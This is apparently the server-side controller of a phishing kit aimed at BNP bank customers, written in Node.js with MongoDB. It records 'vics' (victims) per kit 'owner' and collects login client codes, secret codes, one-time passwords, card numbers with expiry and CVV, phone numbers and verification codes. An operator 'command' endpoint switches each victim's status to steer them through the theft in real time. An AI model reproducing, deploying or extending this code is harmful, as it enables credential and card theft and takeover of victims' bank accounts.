var moment = require("moment"); // require
const BNP = require("../models/bnpModel");

const getOwnerVics = async (req, res) => {
	const { owner } = req.params;
	BNP.find({ owner })
		.sort({ timestamp: -1 })
		.exec((err, vics) => {
			if (err) {
				console.log(err);
				res.status(404).send("Error");
				return;
			}
			res.send(vics);
		});
};

const command = async (req, res) => {
	const { uniqueid, status } = req.body;
	try {
		await BNP.findOneAndUpdate({ uniqueid }, { status }).exec();
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const getInfo = async (req, res) => {
	const { uniqueid } = req.params;
	BNP.findOne({ uniqueid }).exec((err, vic) => {
		if (err) {
			console.log(err);
			res.status(404).send("Error");
			return;
		}
		res.send(vic);
	});
};

const submitLogin = async (req, res) => {
	const { clientCode, secretCode, uniqueid, owner, ip } = req.body;
	try {
		await BNP.create({
			uniqueid,
			clientCode,
			secretCode,
			status: 1,
			owner,
			ip,
			timestamp: moment().format(),
		});
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const submitLoginAgain = async (req, res) => {
	const { clientCode, secretCode, uniqueid } = req.body;
	try {
		await BNP.findOneAndUpdate(
			{ uniqueid },
			{ clientCode, secretCode, status: 13, timestamp: moment().format() }
		).exec();
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const submitOtp = async (req, res) => {
	const { otp, uniqueid } = req.body;
	try {
		await BNP.findOneAndUpdate(
			{ uniqueid },
			{ otp, status: 3, timestamp: moment().format() }
		).exec();
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const submitCard = async (req, res) => {
	const { ccnum, ccexp, cccvv, uniqueid } = req.body;
	try {
		await BNP.findOneAndUpdate(
			{ uniqueid },
			{ ccnum, ccexp, cccvv, status: 9, timestamp: moment().format() }
		).exec();
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const submitTelephone = async (req, res) => {
	const { telephone, uniqueid } = req.body;
	try {
		await BNP.findOneAndUpdate(
			{ uniqueid },
			{ telephone, status: 12, timestamp: moment().format() }
		).exec();
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const submitVerification = async (req, res) => {
	const { verificationCode, uniqueid } = req.body;
	try {
		await BNP.findOneAndUpdate(
			{ uniqueid },
			{ verificationCode, status: 7, timestamp: moment().format() }
		).exec();
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const deleteEntry = async (req, res) => {
	const { uniqueid } = req.body;
	try {
		await BNP.deleteOne({ uniqueid });
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

module.exports = {
	getOwnerVics,
	command,
	getInfo,
	submitLogin,
	submitLoginAgain,
	submitVerification,
	submitCard,
	submitTelephone,
	submitOtp,
	deleteEntry,
};
